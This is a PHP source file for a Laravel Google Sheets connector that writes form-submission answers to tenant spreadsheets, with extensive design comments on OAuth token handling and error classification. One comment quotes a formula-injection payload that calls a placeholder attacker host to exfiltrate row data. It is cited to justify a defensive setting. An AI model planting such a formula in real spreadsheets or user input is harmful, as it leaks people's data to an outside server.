<?php

declare(strict_types=1);

namespace App\Support\Connectors\Providers;

use App\Enums\ConnectorProviderKey;
use App\Exceptions\Connectors\ConnectorOAuthException;
use App\Exceptions\Webhooks\BlockedWebhookUrlException;
use App\Jobs\Connectors\DeliverConnectorMessageJob;
use App\Models\Connection;
use App\Models\ConnectionSubscription;
use App\Models\Submission;
use App\Services\Submissions\SubmissionRowProjector;
use App\Support\Connectors\ConnectorDeliveryResult;
use App\Support\Connectors\ConnectorGrant;
use App\Support\Connectors\ConnectorProvider;
use App\Support\Mapping\ColumnMapping;
use App\Support\Mapping\MappingDriftDetector;
use App\Support\Webhooks\OutboundUrlGuard;
use Illuminate\Http\Client\ConnectionException;
use Illuminate\Http\Client\Response;
use Illuminate\Support\Carbon;
use Illuminate\Support\Facades\Http;
use InvalidArgumentException;

/**
 * The Google Sheets adapter — the second {@see ConnectorProvider} (ADR-0009, webhook-integration-design.md §4
 * row 4, H16a), and the one that forced three of the framework's assumptions to be re-decided.
 *
 * ── WHAT IS DIFFERENT ABOUT THIS PROVIDER ────────────────────────────────────────────────────────────────
 *
 * 1. **It writes ANSWERS, not just the envelope.** Every other channel in the repo — webhooks, Slack — sends
 *    `DomainEvent`'s metadata-only payload, and `SubmissionCreated::data()` says in a comment why it excludes
 *    answers. A spreadsheet of submission ids would be useless, so this adapter RESOLVES the submission at
 *    delivery time and projects its answers through the rule's stored {@see ColumnMapping}. Two consequences
 *    are deliberate: the shared ledger still stores only the metadata envelope, so `webhook_deliveries` never
 *    becomes a second copy of answer content; and a re-delivery reflects the submission AS OF re-delivery,
 *    because the answers are read, not carried. `docs/data-privacy-gdpr-compliance.md` §7 is revised in this
 *    increment, as that bullet itself required of whichever increment made this true.
 *
 * 2. **It READS from the provider.** Drift detection must see the destination's header row before appending,
 *    which is ADR-0009 §D8's named revisit trigger for read scopes. The answer is `drive.file` and nothing
 *    else — Google's own "Recommended, Non-sensitive" scope for the Sheets API — so we can reach only files
 *    this app created or the tenant explicitly picked. `spreadsheets` (Sensitive) and `drive.readonly`
 *    (Restricted) were both refused; see `config/connectors.php` for the full reasoning.
 *
 * 3. **Its tokens actually expire.** Slack's bot tokens do not, so the refresh path was effectively dead code
 *    until now. Google's live ~1 hour, which fires ADR-0009 §D6's revisit trigger; the pre-flight guard is in
 *    {@see DeliverConnectorMessageJob}, and the classification below is its other half.
 *
 * ── THE CLASSIFICATION TRAP, WHICH IS THE SHARPEST THING IN THIS FILE ────────────────────────────────────
 *
 * **Google returns HTTP 401 `authError` / "Invalid Credentials" for an EXPIRED access token and for a REVOKED
 * grant alike** (verified against its error guide at implementation time; the Slack analogue is not a
 * comparable signal because Slack tokens do not expire). The API response cannot tell them apart at all. The
 * only place the difference is observable is the TOKEN endpoint, which answers `invalid_grant` if and only if
 * the grant is genuinely dead.
 *
 * So a 401 here is reported as a RETRYABLE failure, never as {@see ConnectorDeliveryResult::credentialRejected()}.
 * Mapping it the obvious way — 401 means bad credentials — would make an ordinary hourly token expiry revoke
 * the tenant's connection, clear their tokens and email them, roughly once an hour, forever. The grant is
 * declared dead only by {@see refresh()} throwing, which is the one call that can actually know.
 *
 * Every outbound call goes through {@see OutboundUrlGuard} first, per the interface's stated rules: the host
 * is ours-by-config rather than tenant-supplied, so this is not the SSRF case the guard was written for, but
 * "config named it" is a weaker guarantee than "we checked it".
 */
final class GoogleSheetsConnector implements ConnectorProvider
{
    private const AUTHORIZE_URL = 'https://accounts.google.com/o/oauth2/v2/auth';

    private const TOKEN_URL = 'https://oauth2.googleapis.com/token';

    private const SHEETS_BASE = 'https://sheets.googleapis.com/v4/spreadsheets';

    /**
     * Token-endpoint errors meaning THE GRANT IS DEAD rather than "this request failed". `invalid_grant` is
     * Google's documented answer for a refresh token that was revoked, expired, or belongs to a deleted
     * account; the other two are the app-registration cases, which no retry can fix either.
     */
    private const CREDENTIAL_ERRORS = ['invalid_grant', 'invalid_client', 'unauthorized_client'];

    public function __construct(
        private readonly OutboundUrlGuard $guard,
        private readonly SubmissionRowProjector $projector,
        private readonly MappingDriftDetector $drift,
    ) {}

    public function key(): ConnectorProviderKey
    {
        return ConnectorProviderKey::GoogleSheets;
    }

    /** `$codeVerifier` is unused: Google permits PKCE for a confidential client but does not require it. */
    public function authorizeUrl(string $state, string $redirectUri, string $codeVerifier): string
    {
        /** @var array<string, string> $extra */
        $extra = (array) config('connectors.providers.google_sheets.auth_params', []);

        return self::AUTHORIZE_URL.'?'.http_build_query(array_merge([
            'client_id' => (string) config('connectors.providers.google_sheets.client_id'),
            'redirect_uri' => $redirectUri,
            'response_type' => 'code',
            'scope' => implode(' ', $this->scopes()), // Google delimits scopes with SPACES, unlike Slack's commas
            'state' => $state,
        ], $extra));
    }

    /** `$codeVerifier` is unused — see {@see authorizeUrl()}; nothing was sent, so nothing is proved. */
    public function exchangeCode(string $code, string $redirectUri, string $codeVerifier): ConnectorGrant
    {
        $body = $this->postForm(self::TOKEN_URL, [
            'client_id' => (string) config('connectors.providers.google_sheets.client_id'),
            'client_secret' => (string) config('connectors.providers.google_sheets.client_secret'),
            'code' => $code,
            'grant_type' => 'authorization_code',
            'redirect_uri' => $redirectUri,
        ], fn (string $error): ConnectorOAuthException => ConnectorOAuthException::exchangeFailed($error, $this->isTerminal($error)));

        return $this->grantFrom($body, null);
    }

    public function refresh(string $refreshToken): ConnectorGrant
    {
        $body = $this->postForm(self::TOKEN_URL, [
            'client_id' => (string) config('connectors.providers.google_sheets.client_id'),
            'client_secret' => (string) config('connectors.providers.google_sheets.client_secret'),
            'grant_type' => 'refresh_token',
            'refresh_token' => $refreshToken,
        ], fn (string $error): ConnectorOAuthException => ConnectorOAuthException::refreshFailed($error, $this->isTerminal($error)));

        // Google does NOT return a refresh token on a refresh — only on the first authorization. Passing the
        // one we already hold keeps ConnectionService::applyRefreshedGrant() from nulling it, which would turn
        // every connection into a one-hour connection at the first successful renewal.
        return $this->grantFrom($body, $refreshToken);
    }

    public function deliver(Connection $connection, ConnectionSubscription $subscription, array $envelope): ConnectorDeliveryResult
    {
        $config = $subscription->config;
        $spreadsheetId = is_string($config['spreadsheet_id'] ?? null) ? $config['spreadsheet_id'] : '';
        $sheetName = is_string($config['sheet_name'] ?? null) && $config['sheet_name'] !== '' ? $config['sheet_name'] : 'Sheet1';

        if ($spreadsheetId === '') {
            // Structurally undeliverable. Blocked rather than failed: no retry can supply a missing id, and
            // blocked is also what tells the tenant, which a silent seven-day walk to the dead letter is not.
            return ConnectorDeliveryResult::blocked(null, '[missing_spreadsheet] This rule has no destination spreadsheet configured.');
        }

        try {
            $mapping = ColumnMapping::fromArray(is_array($config['mapping'] ?? null) ? $config['mapping'] : []);
        } catch (InvalidArgumentException) {
            return ConnectorDeliveryResult::blocked(null, '[invalid_mapping] This rule’s column mapping could not be read. Open the rule and set it up again.');
        }

        $submissionId = $envelope['data']['submission_id'] ?? null;

        if (! is_string($submissionId) || $submissionId === '') {
            // Only `submission.*` events carry answers. A form.published/opened/closed rule pointed at a sheet
            // has nothing to write, and saying so beats appending a row of blanks on every publish.
            return ConnectorDeliveryResult::blocked(null, '[unsupported_event] Only submission events can be written to a spreadsheet.');
        }

        // Read the destination's header row FIRST. Every append is gated on the layout still matching, because
        // the cost of being wrong is asymmetric: a refused write is visible and reversible, and a row written
        // under the wrong headings is neither.
        $headers = $this->readHeaderRow($connection, $spreadsheetId, $sheetName);

        if ($headers instanceof ConnectorDeliveryResult) {
            return $headers;
        }

        $verdict = $this->drift->compare($mapping, $headers);

        if ($verdict->hasDrifted) {
            // ⚠️ THE `[column_drift]` PREFIX IS LOAD-BEARING AND WAS MISSING UNTIL H16c FOUND IT.
            // `ConnectionPresenter::pausedReasons()` selects paused rules' excerpts with `LIKE '[%]%'`, because
            // only a `blocked` outcome carries copy we wrote — an ordinary failure's excerpt is the provider's
            // raw response body. `MappingDrift::summary()` is our copy but carries no code, so every drifted
            // rule in production stored a reason the presenter then dropped: the tenant saw a paused rule with
            // NO explanation, and the drift card H16b exists to render never appeared.
            //
            // It went unnoticed because the e2e seeder fabricates a correctly-prefixed excerpt that this line
            // never produced — a test certifying a behaviour the code did not have. The engine cannot add the
            // prefix itself: `App\Support\Mapping` is forbidden from knowing about connectors, and
            // `MappingNamespaceBoundaryTest` enforces that by parsing the source.
            return ConnectorDeliveryResult::blocked(null, '[column_drift] '.$verdict->summary());
        }

        $row = $this->rowFor($submissionId, $mapping);

        if ($row === null) {
            // Deleted, or invisible under this tenant's RLS between the event and the delivery. Not an error
            // and not retryable: there is nothing to write and there never will be.
            return ConnectorDeliveryResult::blocked(null, '[submission_gone] That submission no longer exists, so nothing was written.');
        }

        return $this->append($connection, $spreadsheetId, $sheetName, $row);
    }

    /**
     * The destination's first row, or a terminal outcome if it cannot be read.
     *
     * @return list<string|null>|ConnectorDeliveryResult
     */
    private function readHeaderRow(Connection $connection, string $spreadsheetId, string $sheetName): array|ConnectorDeliveryResult
    {
        $url = self::SHEETS_BASE.'/'.rawurlencode($spreadsheetId).'/values/'.rawurlencode(self::a1Range($sheetName, '!1:1'));

        $response = $this->send($connection, fn (): Response => Http::withToken($connection->access_token)
            ->withOptions(['allow_redirects' => false])
            ->connectTimeout((int) config('webhooks.connect_timeout', 5))
            ->timeout((int) config('webhooks.delivery_timeout', 10))
            ->get($url, ['majorDimension' => 'ROWS']));

        if ($response instanceof ConnectorDeliveryResult) {
            return $response;
        }

        if (! $response->successful()) {
            return $this->classifyFailure($response);
        }

        $values = $response->json('values');
        $first = is_array($values) && is_array($values[0] ?? null) ? $values[0] : [];

        return array_values(array_map(
            static fn (mixed $cell): ?string => is_scalar($cell) ? (string) $cell : null,
            $first,
        ));
    }

    /**
     * Append one row, with formulas disarmed.
     *
     * `valueInputOption=RAW` is a SECURITY control, not a formatting preference. `security-threat-model.md`
     * §5 carries an open formula-injection defect against the CSV/XLSX export path, and a live Google Sheet is
     * a strictly worse instance of the same sink: `=IMPORTXML("https://attacker.example?d="&A2, "//x")` in a
     * respondent's answer would be evaluated by GOOGLE'S servers the moment it lands, exfiltrating the row
     * with no human ever opening the file. Under RAW, Google's own documentation is explicit that input is
     * "treated literally (formulas beginning with = are treated as text values)" — a structural fix rather
     * than the `'`-prefix the CSV path still owes, and one that cannot be undone by a careless caller because
     * there is no other way to write here.
     *
     * `insertDataOption=INSERT_ROWS` matters almost as much and is easy to miss: the API's DEFAULT is
     * OVERWRITE, which writes over whatever already occupies the cells below the detected table. On a sheet
     * where the tenant keeps a totals block or notes under their data, the default would silently destroy it.
     *
     * @param  list<string>  $row
     */
    private function append(Connection $connection, string $spreadsheetId, string $sheetName, array $row): ConnectorDeliveryResult
    {
        $url = self::SHEETS_BASE.'/'.rawurlencode($spreadsheetId).'/values/'.rawurlencode(self::a1Range($sheetName)).':append';

        $response = $this->send($connection, fn (): Response => Http::withToken($connection->access_token)
            ->withOptions(['allow_redirects' => false])
            ->connectTimeout((int) config('webhooks.connect_timeout', 5))
            ->timeout((int) config('webhooks.delivery_timeout', 10))
            ->asJson()
            ->post($url.'?'.http_build_query([
                'valueInputOption' => 'RAW',
                'insertDataOption' => 'INSERT_ROWS',
            ]), ['values' => [$row]]));

        if ($response instanceof ConnectorDeliveryResult) {
            return $response;
        }

        return $response->successful()
            ? ConnectorDeliveryResult::delivered($response->status(), 'ok')
            : $this->classifyFailure($response);
    }

    /**
     * One submission's cells, in the mapping's column order — or null if it is gone.
     *
     * Runs under the delivery job's tenant context, so the read is RLS-scoped: a submission belonging to
     * another tenant is invisible rather than forbidden, and reads as "gone", which is the correct outcome.
     *
     * @return list<string>|null
     */
    private function rowFor(string $submissionId, ColumnMapping $mapping): ?array
    {
        $submission = Submission::query()->with(['answers', 'respondent:id,name', 'formVersion.form'])->find($submissionId);

        if ($submission === null) {
            return null;
        }

        $version = $submission->formVersion;

        if ($version === null) {
            return null;
        }

        // The FORM's default locale, not the respondent's (H6b): a spreadsheet is read as one document, so a
        // column of choice labels in per-respondent languages is unusable for analysis. Identical to the
        // export's rule, because it is now literally the same projector.
        $locale = $version->form->default_locale ?? 'en';

        [, $fieldMeta] = $this->projector->resolveColumns(collect([$version]), $locale);

        // Metadata second so a form field could never shadow a reserved `__`-prefixed key — belt and braces
        // beside the prefix itself, since `form_fields.key` is author-chosen.
        $values = array_merge(
            $this->projector->answerValues($submission, $fieldMeta, $locale),
            $this->projector->metaValues($submission),
        );

        return $mapping->project($values);
    }

    /**
     * Run one Sheets call, converting a transport error into a retryable outcome.
     *
     * @param  callable(): Response  $call
     */
    private function send(Connection $connection, callable $call): Response|ConnectorDeliveryResult
    {
        try {
            $this->guard->assertPublic(self::SHEETS_BASE);
        } catch (BlockedWebhookUrlException $e) {
            return ConnectorDeliveryResult::failed(null, '['.$e->reason.'] '.$e->getMessage());
        }

        try {
            return $call();
        } catch (ConnectionException $e) {
            return ConnectorDeliveryResult::failed(null, $this->excerpt('[transport_error] '.$e->getMessage()));
        }
    }

    /**
     * Map one unsuccessful Sheets response onto the ledger's vocabulary.
     *
     * READ THE CLASS DOCBLOCK BEFORE CHANGING THIS. The absence of a `credentialRejected` arm is the decision,
     * not an oversight: Google answers 401 identically for an expired token and a revoked grant, so only
     * {@see refresh()} can tell them apart, and treating 401 as terminal here would revoke a live connection
     * every time an hour passed.
     */
    private function classifyFailure(Response $response): ConnectorDeliveryResult
    {
        $status = $response->status();
        $reason = is_string($response->json('error.status')) ? (string) $response->json('error.status') : '';

        // 404 — the file is gone, was never shared with this app, or the tab was renamed. 403 PERMISSION_DENIED
        // is the `drive.file` case: a spreadsheet the tenant owns but never picked through us. Both are
        // rule-level and human-fixable, and neither improves by being retried for seven days.
        if ($status === 404) {
            return ConnectorDeliveryResult::blocked($status, '[not_found] We can’t open that spreadsheet or tab. It may have been deleted, renamed, or never shared with this app.');
        }

        if ($status === 403 && ! $this->isRateLimit($reason, $response)) {
            return ConnectorDeliveryResult::blocked($status, '[permission_denied] This connection isn’t allowed to write to that spreadsheet. Re-pick the file for this rule.');
        }

        // 400 INVALID_ARGUMENT is Google's answer for a range it cannot parse and for a TAB THAT DOES NOT
        // EXIST — a renamed or deleted worksheet, which is the single most likely way a working rule breaks
        // after setup. It is human-fixable and permanent, so retrying it burns the whole seven-day ladder to
        // reach a dead letter nobody is told about; blocked pauses the rule and says what to do.
        if ($status === 400) {
            return ConnectorDeliveryResult::blocked($status, '[bad_range] We couldn’t find that tab in the spreadsheet. It may have been renamed or deleted — open the rule and pick it again.');
        }

        // Everything else — 401 (see above), 429, 5xx, and any 403 that is a quota — rides the ladder.
        return ConnectorDeliveryResult::failed($status, $this->excerpt('['.($reason !== '' ? $reason : 'http_'.$status).'] Google refused the write.'));
    }

    /**
     * A sheet name in A1 notation, ALWAYS quoted.
     *
     * A1 notation requires single quotes around any sheet name containing a space, a punctuation character or
     * a leading digit, and this is not an exotic edge case: **Google's own default tab name for a form-linked
     * sheet is "Form Responses 1"**. Unquoted, `Form Responses 1!1:1` is not a parseable range, so the
     * connector would fail for a very ordinary destination — and fail as a 400, i.e. as a retry, so it would
     * spend seven days on the ladder and dead-letter with the tenant never told why.
     *
     * Quoting is unconditional rather than conditional-on-suspicious-characters: `'Sheet1'!1:1` is equally
     * valid, and a predicate over "which characters need quoting" is a second thing to get wrong. An internal
     * apostrophe is escaped by DOUBLING it, which is A1's own rule — a tab named `Ana's data` becomes
     * `'Ana''s data'`.
     */
    private static function a1Range(string $sheetName, string $suffix = ''): string
    {
        return "'".str_replace("'", "''", $sheetName)."'".$suffix;
    }

    /**
     * Whether a token-endpoint refusal means the GRANT IS DEAD, as opposed to "that request failed".
     *
     * This is the one decision only the adapter can make, and getting it wrong is expensive in both
     * directions: too eager and a network timeout permanently destroys a working connection; too lax and a
     * revoked grant is retried forever. Google's `invalid_grant` is documented as the revoked/expired/deleted
     * case; `invalid_client`/`unauthorized_client` are app-registration faults, equally unfixable by retrying.
     * Everything else — transport errors, 5xx, rate limits — leaves the connection alive to try again.
     */
    private function isTerminal(string $errorCode): bool
    {
        return in_array($errorCode, self::CREDENTIAL_ERRORS, true);
    }

    private function isRateLimit(string $reason, Response $response): bool
    {
        if ($reason === 'RESOURCE_EXHAUSTED') {
            return true;
        }

        $body = (string) $response->body();

        return str_contains($body, 'rateLimitExceeded')
            || str_contains($body, 'userRateLimitExceeded')
            || str_contains($body, 'quotaExceeded');
    }

    /**
     * The shared token-endpoint call. Guards the host, POSTs form-encoded, and converts a transport error or
     * an error body into the caller's exception.
     *
     * Unlike Slack, Google reports token failures with a real HTTP status AND an `error` field, so both are
     * consulted: a 200 with an `error` key and a 400 with one mean the same thing.
     *
     * @param  array<string, string>  $form
     * @param  callable(string, bool=): ConnectorOAuthException  $failure
     * @return array<string, mixed>
     */
    private function postForm(string $url, array $form, callable $failure): array
    {
        try {
            $this->guard->assertPublic($url);
        } catch (BlockedWebhookUrlException $e) {
            throw $failure($e->reason);
        }

        try {
            $response = Http::withOptions(['allow_redirects' => false])
                ->connectTimeout((int) config('webhooks.connect_timeout', 5))
                ->timeout((int) config('webhooks.delivery_timeout', 10))
                ->asForm()
                ->post($url, $form);
        } catch (ConnectionException) {
            throw $failure('transport_error');
        }

        $body = $response->json();

        if (! is_array($body) || ! $response->successful() || isset($body['error'])) {
            $error = is_array($body) && is_string($body['error'] ?? null) ? $body['error'] : 'unknown_error';

            throw $failure($error);
        }

        return $body;
    }

    /**
     * Normalize a Google token response into a grant.
     *
     * The account identity is deliberately NOT fetched from a userinfo endpoint: that would need an identity
     * scope (`openid`/`email`) this connector has no use for, and ADR-0009 §D8's least-privilege rule makes a
     * scope requested purely for a nicer label the wrong trade. The label says what the grant IS.
     *
     * KNOWN NARROWING, recorded rather than discovered later: because `external_account_id` is therefore a
     * CONSTANT, the `connections_tenant_provider_account_unique` partial index allows a tenant exactly ONE
     * live Google connection, and connecting a second Google account UPDATES the first in place rather than
     * sitting beside it. That is the right default here — under `drive.file` a grant reaches only the files
     * picked through it, so "which account" is far less visible than it is for a Slack workspace — but it is a
     * narrowing, and lifting it means buying an identity scope, which is a re-consent decision for H16b.
     *
     * @param  array<string, mixed>  $body
     */
    private function grantFrom(array $body, ?string $existingRefreshToken): ConnectorGrant
    {
        $accessToken = is_string($body['access_token'] ?? null) ? $body['access_token'] : '';

        if ($accessToken === '') {
            throw ConnectorOAuthException::exchangeFailed('missing_access_token');
        }

        $refreshToken = is_string($body['refresh_token'] ?? null) ? $body['refresh_token'] : $existingRefreshToken;

        if ($refreshToken === null && $existingRefreshToken === null) {
            // No refresh token on the FIRST exchange means `access_type=offline`/`prompt=consent` did not take
            // effect — a config error, not a tenant error. Refusing here is what stops a connection that looks
            // healthy for one hour and then dies with no way to renew it.
            throw ConnectorOAuthException::exchangeFailed('missing_refresh_token');
        }

        $expiresIn = $body['expires_in'] ?? null;

        return new ConnectorGrant(
            accessToken: $accessToken,
            refreshToken: $refreshToken,
            expiresAt: is_int($expiresIn) && $expiresIn > 0 ? Carbon::now()->addSeconds($expiresIn) : null,
            scopes: $this->grantedScopes($body),
            externalAccountId: 'google-drive',
            externalAccountLabel: 'Google Sheets',
        );
    }

    /**
     * @param  array<string, mixed>  $body
     * @return list<string>
     */
    private function grantedScopes(array $body): array
    {
        // Google space-delimits the granted scope list, where Slack comma-delimits it.
        $scope = is_string($body['scope'] ?? null) ? $body['scope'] : '';

        return $scope === '' ? $this->scopes() : array_values(array_filter(explode(' ', $scope)));
    }

    /** @return list<string> */
    private function scopes(): array
    {
        $scopes = config('connectors.providers.google_sheets.scopes', []);

        return is_array($scopes) ? array_values(array_map(strval(...), $scopes)) : [];
    }

    private function excerpt(string $body): string
    {
        return mb_substr($body, 0, (int) config('webhooks.response_excerpt_bytes', 2000));
    }
}
